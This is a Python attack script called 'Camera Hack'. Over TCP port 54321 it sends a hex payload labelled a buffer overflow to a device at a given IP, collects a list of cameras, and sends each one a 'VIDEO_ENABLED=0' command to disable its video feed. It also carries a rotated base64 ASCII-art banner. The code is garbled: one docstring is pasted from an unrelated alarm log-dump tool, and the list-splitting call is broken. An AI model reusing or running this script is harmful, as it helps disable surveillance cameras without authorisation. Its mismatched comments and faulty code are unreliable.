import argparse
import socket
import base64

# Python3

TCP_PORT = 54321
BUFFER_SIZE = 32
BUFFER_OVERFLOW = bytes.fromhex("594341534a2045204c424242")
DISABLE = bytes.fromhex("564944454f5f454e41424c45443d30")

def hack(ip):
    """
    Hacks the cameras from GNB
    :param ip: ip address of the camera devices
    :return: camera list to disable
    """
    ip = str(ip)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, TCP_PORT))
    s.send(BUFFER_OVERFLOW)
    cameras = s.recv(BUFFER_SIZE)
    s.close()
    return cameras.split(b"")

def disable(cameras):
    """
    Dumps the log from the ismartalarm
    :param ip: ip address of the ismartalarm device
    :param verbose: whether or not to print debug info to the stderr
    :return: collected log as a binary string
    """
    # Force ip to str (if eg. ip == ipaddress class)
    # Getting Auth Key
    for camera in cameras:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((camera, TCP_PORT))
        s.send(DISABLE)
        data = s.recv(BUFFER_SIZE)
        s.close()

def j():
    string = b'XyBcIHxffCB8ICB8IHwgIF9fL1xfXyBcCiBcLyAgXC8gXF9fLF98XF9fLCB8X3wgfF98XF9fX3wgIFxfX18vX3wgfF98XF9fLF98XF9fLF98X19fL1xfX3xffCAgfF98XF9fX3x8X19fLwogICAgICAgICAgICAgICBfXy8gfAogICAgICAgICAgICAgIHxfX18vCg==CiAgICAgICAgICAgICAgICAgICAgXz09LyAgICAgICAgICAgaSAgICAgaSAgICAgICAgICAgXD09XwogICAgICAgICAgICAgICAgICAgL1hYLyAgICAgICAgICAgIHxcX19fL3wgICAgICAgICAgICBcWFhcCiAgICAgICAgICAgICAgICAgL1hYWFhcICAgICAgICAgICAgfFhYWFhYfCAgICAgICAgICAgIC9YWFgKICAgICAgICAgICAgICAgIHxYWFhYWFhcXyAgICAgICAgIF9YWFhYWFhYXyAgICAgICAgIF8vWFhYWFhYfAogICAgICAgICAgICAgICBYWFhYWFhYWFhYWHh4eHh4eHhYWFhYWFhYWFhYWHh4eHh4eHhYWFhYWFhYWFhYWAogICAgICAgICAgICAgIHxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWHwKICAgICAgICAgICAgICBYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYCiAgICAgICAgICAgICAgfFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYfAogICAgICAgICAgICAgICBYWFhYWFgvXl5eXiJcWFhYWFhYWFhYWFhYWFhYWFhYWFhYL15eXl5eXFhYWFhYWAogICAgICAgICAgICAgICAgfFhYWHwgICAgICAgXFhYWC9eXlxYWFhYWC9eXlxYWFgvICAgICAgIHxYWFh8CiAgICAgICAgICAgICAgICAgIFxYWFwgICAgICAgXFgvICAgIFxYWFgvICAgIFxYLyAgICAgICAvWFgvCiAgICAgICAgICAgICAgICAgICAgICJcICAgICAgICIgICAgICBcWC8gICAgICAiICAgICAgIC8iCgogICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKIF8gICAgXyAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX18gICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgXwp8IHwgIHwgfCAgICAgICAgICAgICAgICAgICAgICAgIHxfICAgX3wgICAgICAgIHwgfCAgICAgICAgIHwgfCAgICAgIChfKQp8IHwgIHwgfCBfXyBfIF8gICBfIF8gX18gICBfX18gICAgfCB8IF8gX18gICBfX3wgfF8gICBfIF9fX3wgfF8gXyBfXyBfICBfX18gIF9fXwp8IHwvXHwgfC8gX2AgfCB8IHwgfCAnXyBcIC8gXyBcICAgfCB8fCAnXyBcIC8gX2AgfCB8IHwgLyBfX3wgX198ICdfX3wgfC8gXyBcLyBfX3wKXCAgL1wgIC8gKF98IHwgfF98IHwgfCB8IHwgIF9fLyAgX3wgfHwgfCB8IHwgKF98IHwgfF98IFxf'
    return base64.b64decode(string[200:] + string[:200]).decode('utf-8')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Camera Hack")
    parser.add_argument('--version', action='version', version='%(prog)s 0.1')
    parser.add_argument('-j', help="Try", action='store_true')
    parser.add_argument('-i', '--ip', help='IP Address of the camera to HACK.', type=str)

    args = parser.parse_args()

    if args.j:
        print(j())

    elif args.ip:
        disable(hack(args.ip))
